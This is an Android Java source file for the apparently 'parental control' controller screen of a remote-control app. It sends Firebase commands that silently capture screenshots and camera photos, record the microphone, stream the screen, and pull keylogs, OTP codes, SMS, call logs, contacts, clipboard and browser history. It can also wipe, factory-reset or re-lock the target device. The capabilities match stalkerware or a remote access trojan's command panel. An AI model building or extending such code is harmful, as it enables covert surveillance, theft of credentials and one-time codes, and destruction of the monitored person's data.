package com.kidsguard.parent;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.Intent;
import android.graphics.Color;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;

import java.util.LinkedHashMap;
import java.util.Map;

public class RemoteControlActivity extends Activity {

    String deviceCode;
    LinearLayout container;

    private final Map<String, String[][]> CATEGORIES = new LinkedHashMap<>();

    {
        CATEGORIES.put("Live Stream & Capture", new String[][]{
            {"WATCH LIVE SCREEN STREAM", "start_stream", ""},
            {"STOP LIVE STREAM", "stop_stream", ""},
            {"CAPTURE REAR CAMERA PHOTO", "camera", "back"},
            {"CAPTURE FRONT CAMERA PHOTO", "camera", "front"},
            {"TRIGGER SCREENSHOT (SILENT)", "screenshot", ""},
            {"START SCREEN RECORDING", "start_screen_record", ""},
            {"STOP SCREEN RECORDING", "stop_screen_record", ""},
        });

        CATEGORIES.put("Location", new String[][]{
            {"FORCE GPS TRACK", "get_location", ""},
            {"LOCATION PROVIDERS", "get_location_providers", ""},
        });

        CATEGORIES.put("Monitoring", new String[][]{
            {"START MIC RECORDING", "start_mic", ""},
            {"STOP MIC RECORDING", "stop_mic", ""},
            {"SYNC KEYLOGS", "get_keylog", ""},
            {"SYNC CLIPBOARD", "get_clipboard", ""},
            {"SYNC OTP CODES", "get_otp", ""},
            {"SYNC NOTIFICATIONS", "get_notifications", ""},
            {"SYNC SCREEN TIME", "get_screen_time", ""},
            {"SYNC APP USAGE", "get_screen_time", ""},
            {"SYNC SOCIAL MEDIA", "get_notifications", ""},
        });

        CATEGORIES.put("App Blocking", new String[][]{
            {"BLOCK SPECIFIC APP", "block_app", "PKG_NAME"},
            {"UNBLOCK ALL APPS", "unblock_all", ""},
        });

        CATEGORIES.put("Device Control", new String[][]{
            {"LOCK SCREEN", "lock_screen", ""},
            {"REMOTE LOCK", "remote_lock", ""},
            {"PLAY ALARM", "send_alarm", ""},
            {"VIBRATE DEVICE", "vibrate_device", ""},
            {"TOGGLE FLASHLIGHT", "toggle_flashlight", ""},
            {"TOGGLE WIFI", "toggle_wifi", ""},
            {"TOGGLE BLUETOOTH", "toggle_bluetooth", ""},
            {"TOGGLE ROTATION", "toggle_rotation", ""},
            {"TOGGLE SCREEN BRIGHTNESS", "get_brightness", ""},
            {"OPEN URL", "open_browser_url", "https://google.com"},
            {"EMULATE HOME", "global_action", "home"},
            {"EMULATE BACK", "global_action", "back"},
            {"EMULATE RECENTS", "global_action", "recents"},
        });

        CATEGORIES.put("Device Info", new String[][]{
            {"DEVICE HARDWARE", "get_device_info", ""},
            {"CPU INFO", "get_cpu_info", ""},
            {"CPU CORES", "get_cpu_cores_count", ""},
            {"CPU ABI", "get_cpu_abi", ""},
            {"MEMORY INFO", "get_memory_info", ""},
            {"RAM INFO", "get_device_memory_info", ""},
            {"STORAGE INFO", "get_storage_info", ""},
            {"AVAILABLE STORAGE", "get_available_storage_bytes", ""},
            {"EXTERNAL SD CARD", "get_external_sd_card_status", ""},
            {"DISPLAY INFO", "get_display", ""},
            {"SCREEN RESOLUTION", "get_screen_resolution", ""},
            {"REFRESH RATE", "get_display_refresh_rate", ""},
            {"SCREEN HDR", "get_screen_hdr_capabilities", ""},
            {"BATTERY HEALTH", "get_battery_health", ""},
            {"CHARGING STATUS", "get_is_charging", ""},
            {"BATTERY SAVER", "get_battery_saver_mode", ""},
            {"THERMAL STATUS", "get_thermal_status", ""},
            {"KERNEL VERSION", "get_kernel_version", ""},
            {"BOOTLOADER", "get_bootloader_version", ""},
            {"BUILD FINGERPRINT", "get_device_build_fingerprint", ""},
            {"SERIAL NUMBER", "get_device_serial_number", ""},
            {"HARDWARE NAME", "get_hardware_name", ""},
            {"MANUFACTURE DATE", "get_device_manufacture_date", ""},
            {"DEVICE HOSTNAME", "get_device_hostname", ""},
            {"SYSTEM UPTIME", "get_system_uptime", ""},
            {"ROOT STATUS", "get_root_status", ""},
            {"DRM INFO", "get_drm_info", ""},
            {"OPENGL VERSION", "get_opengl_version", ""},
            {"NFC STATUS", "get_nfc_status", ""},
            {"VIBRATOR", "get_vibrator_has_vibrator", ""},
            {"FINGERPRINT STATUS", "get_fingerprint_status", ""},
            {"KEYGUARD SECURE", "get_keyguard_secure", ""},
            {"DEVICE OWNER", "get_device_owner", ""},
            {"MULTI-WINDOW", "get_multi_window_mode", ""},
            {"APP TARGET SDK", "get_app_target_sdk", ""},
            {"SHARED LIBRARIES", "get_system_shared_libraries", ""},
            {"PACKAGE SIGNATURES", "get_package_signatures", ""},
        });

        CATEGORIES.put("Network", new String[][]{
            {"WIFI DETAILS", "get_wifi", ""},
            {"SCAN WIFI", "scan_wifi", ""},
            {"WIFI MAC", "get_wifi_mac_address", ""},
            {"NETWORK INFO", "get_network_info", ""},
            {"NETWORK INTERFACES", "get_network_interfaces", ""},
            {"NETWORK COUNTRY", "get_network_country_iso", ""},
            {"DATA ACTIVITY", "get_data_activity_state", ""},
            {"DNS INFO", "get_dns_info", ""},
            {"TELEPHONY INFO", "get_telephony_info", ""},
            {"SIM STATE", "get_sim_state", ""},
            {"SIGNAL STRENGTH", "get_telephony_info", ""},
        });

        CATEGORIES.put("System", new String[][]{
            {"RUNNING PROCESSES", "get_running_processes", ""},
            {"RUNNING SERVICES", "get_running_services", ""},
            {"RUNNING APP PROCESSES", "get_running_app_processes", ""},
            {"RECENT TASKS", "get_recent_tasks", ""},
            {"INSTALLED APPS", "get_installed_apps", ""},
            {"USER ACCOUNTS", "get_accounts", ""},
            {"SENSOR LIST", "get_sensor_list", ""},
            {"HARDWARE SENSORS", "get_hardware_sensors", ""},
            {"AMBIENT LIGHT", "get_ambient_light", ""},
            {"ALARM CLOCK", "get_alarm_clock", ""},
            {"AUDIO MODE", "get_audio_mode", ""},
            {"RINGER MODE", "get_ringer_audio_mode", ""},
            {"VOLUME LEVELS", "get_audio_volume_levels", ""},
            {"MAX VOLUMES", "get_max_audio_volumes", ""},
            {"DEFAULT INPUT METHOD", "get_default_input_method", ""},
            {"FONT SCALE", "get_font_scale", ""},
            {"LOCALE INFO", "get_locale_info", ""},
            {"LOCALE LANGUAGE", "get_locale_language", ""},
            {"SUPPORTED LOCALES", "get_supported_locales", ""},
            {"TIMEZONE", "get_device_time_zone", ""},
            {"RINGTONE URI", "get_ringtone_uri", ""},
            {"WALLPAPER INFO", "get_wallpaper_info", ""},
            {"SCREEN OFF TIMEOUT", "get_screen_off_timeout", ""},
            {"AIRPLANE MODE", "get_airplane_mode", ""},
            {"DO NOT DISTURB", "get_do_not_disturb_mode", ""},
            {"NIGHT MODE STATUS", "get_night_mode_status", ""},
            {"USB STATE", "get_usb_state", ""},
            {"APP OPS", "get_app_ops", ""},
            {"ACCESSIBILITY SERVICES", "get_accessibility_services", ""},
            {"TRIGGER GC", "trigger_gc", ""},
        });

        CATEGORIES.put("Data Access", new String[][]{
            {"SYNC CONTACTS", "get_contacts", ""},
            {"SYNC SMS", "get_sms", ""},
            {"SYNC CALL LOGS", "get_call_logs", ""},
            {"SYNC BROWSER HISTORY", "get_browser_history", ""},
            {"SYNC RECORDINGS", "get_recordings", ""},
            {"SYNC CLIPBOARD TEXT", "get_clipboard_text", ""},
        });

        CATEGORIES.put("Device Admin", new String[][]{
            {"ADMIN STATUS", "get_admin_status", ""},
            {"DPM INFO", "get_dpm_info", ""},
            {"DISABLE CAMERA", "disable_camera", ""},
            {"ENABLE CAMERA", "set_camera_disabled", "false"},
            {"SET SCREEN PIN", "set_pin", "1234"},
            {"RESET PASSWORD", "reset_password", ""},
            {"SET LOCK TIMEOUT", "set_lock_timeout", "30"},
            {"SET SCREEN TIMEOUT", "set_screen_timeout", "30000"},
            {"SET LOCK MESSAGE", "set_lockscreen_message", "Locked by Parent"},
            {"SET MAX FAILED PASSWORDS", "set_max_failed_passwords", "5"},
            {"DISABLE SCREEN CAPTURE", "disable_screen_capture", ""},
            {"ENABLE SCREEN CAPTURE", "set_screen_capture_disabled", "false"},
            {"SET KIOSK MODE", "set_kiosk_mode", ""},
            {"EXIT KIOSK MODE", "start_lock_task", ""},
            {"WIPE DEVICE", "wipe_device", ""},
            {"FACTORY RESET", "factory_reset", ""},
            {"REBOOT DEVICE", "reboot_device", ""},
            {"SET RESTRICTION", "set_restriction", ""},
            {"CLEAR RESTRICTION", "clear_user_restriction", ""},
            {"SET ENCRYPTION", "set_storage_encryption", ""},
            {"DISABLE KEYGUARD", "set_keyguard_disabled", ""},
            {"SET PASSWORD QUALITY", "set_password_quality", ""},
            {"SET PASSWORD RULES", "set_password_rules", ""},
        });
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        deviceCode = getIntent().getStringExtra("device_code");

        ScrollView scroll = new ScrollView(this);
        container = new LinearLayout(this);
        container.setOrientation(LinearLayout.VERTICAL);
        container.setPadding(30, 30, 30, 30);
        scroll.addView(container);
        setContentView(scroll);

        setTitle("Remote Control Centre");
        buildUI();
    }

    private void buildUI() {
        TextView header = new TextView(this);
        header.setText("Live Remote Control Centre");
        header.setTextSize(22);
        header.setTypeface(null, android.graphics.Typeface.BOLD);
        header.setTextColor(Color.WHITE);
        header.setPadding(0, 0, 0, 10);
        container.addView(header);

        TextView desc = new TextView(this);
        desc.setText("Send commands to child device in real-time.");
        desc.setTextSize(14);
        desc.setTextColor(Color.GRAY);
        desc.setPadding(0, 0, 0, 30);
        container.addView(desc);

        // Live stream button — special
        Button btnStream = makeButton("WATCH LIVE SCREEN STREAM (REAL-TIME)", 0xFFC2185B);
        btnStream.setOnClickListener(v -> {
            FirebaseHelper.sendCommand(deviceCode, "start_stream", "");
            Toast.makeText(this, "Stream starting...", Toast.LENGTH_LONG).show();
            new android.os.Handler().postDelayed(() -> {
                Intent i = new Intent(this, LiveStreamActivity.class);
                i.putExtra("device_code", deviceCode);
                startActivity(i);
            }, 5000);
        });
        container.addView(btnStream);

        for (Map.Entry<String, String[][]> entry : CATEGORIES.entrySet()) {
            addCategoryHeader(entry.getKey());
            for (String[] cmd : entry.getValue()) {
                addCommandButton(cmd[0], cmd[1], cmd[2]);
            }
        }

        Button btnClose = makeButton("CLOSE COMMAND CENTRE", 0xFF37474F);
        btnClose.setOnClickListener(v -> finish());
        container.addView(btnClose);
    }

    private void addCategoryHeader(String title) {
        TextView tv = new TextView(this);
        tv.setText(title);
        tv.setTextSize(16);
        tv.setTypeface(null, android.graphics.Typeface.BOLD);
        tv.setTextColor(0xFF00FF88);
        tv.setPadding(0, 30, 0, 10);
        container.addView(tv);
    }

    private void addCommandButton(String label, String cmd, String arg) {
        Button btn = makeButton(label, 0xFF1976D2);
        btn.setOnClickListener(v -> {
            if ("PKG_NAME".equals(arg) || "https://google.com".equals(arg)
                    || "1234".equals(arg) || "Locked by Parent".equals(arg)
                    || "30".equals(arg) || "30000".equals(arg) || "5".equals(arg)) {
                showInputDialog(label, cmd, arg);
            } else {
                FirebaseHelper.sendCommand(deviceCode, cmd, arg);
                Toast.makeText(this, "Sent: " + cmd, Toast.LENGTH_SHORT).show();
                openResult(cmd);
            }
        });
        container.addView(btn);
    }

    private void showInputDialog(String label, String cmd, String defaultVal) {
        final EditText et = new EditText(this);
        et.setHint("Enter value");
        if (!defaultVal.isEmpty() && !"PKG_NAME".equals(defaultVal)) {
            et.setText(defaultVal);
        }
        et.setPadding(50, 30, 50, 30);

        new AlertDialog.Builder(this)
                .setTitle(label)
                .setView(et)
                .setPositiveButton("SEND", (dialog, which) -> {
                    String val = et.getText().toString().trim();
                    if (!val.isEmpty()) {
                        FirebaseHelper.sendCommand(deviceCode, cmd, val);
                        Toast.makeText(this, "Sent: " + cmd, Toast.LENGTH_SHORT).show();
                        openResult(cmd);
                    }
                })
                .setNegativeButton("CANCEL", null)
                .show();
    }

    private void openResult(String cmd) {
        new android.os.Handler().postDelayed(() -> {
            Intent i = new Intent(this, DataViewerActivity.class);
            i.putExtra("device_code", deviceCode);
            i.putExtra("path", "result.json");
            i.putExtra("title", "Result: " + cmd);
            startActivity(i);
        }, 4000);
    }

    private Button makeButton(String text, int color) {
        Button btn = new Button(this);
        btn.setText(text);
        btn.setTextColor(Color.WHITE);
        btn.setTextSize(13);
        btn.setBackgroundColor(color);
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT);
        lp.setMargins(0, 6, 0, 6);
        btn.setLayoutParams(lp);
        btn.setPadding(20, 24, 20, 24);
        return btn;
    }
}
